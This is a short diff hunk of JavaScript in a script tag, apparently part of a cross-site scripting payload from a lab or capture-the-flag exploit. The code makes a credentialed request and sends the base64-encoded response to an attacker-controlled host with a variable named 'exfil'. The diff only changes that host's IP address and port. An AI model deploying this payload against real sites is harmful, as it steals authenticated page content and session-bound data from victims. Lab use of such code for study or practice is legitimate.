@@ -113,7 +113,7 @@ xhr.withCredentials = true;
 xhr.send();
 
 var exfil = new XMLHttpRequest();
-exfil.open("GET", "https://10.10.17.142:4443/exfils?r=" + btoa(xhr.responseText), false);
+exfil.open("GET", "https://10.10.16.180:4444/exfils?r=" + btoa(xhr.responseText), false);
 exfil.send();</script>
 
 
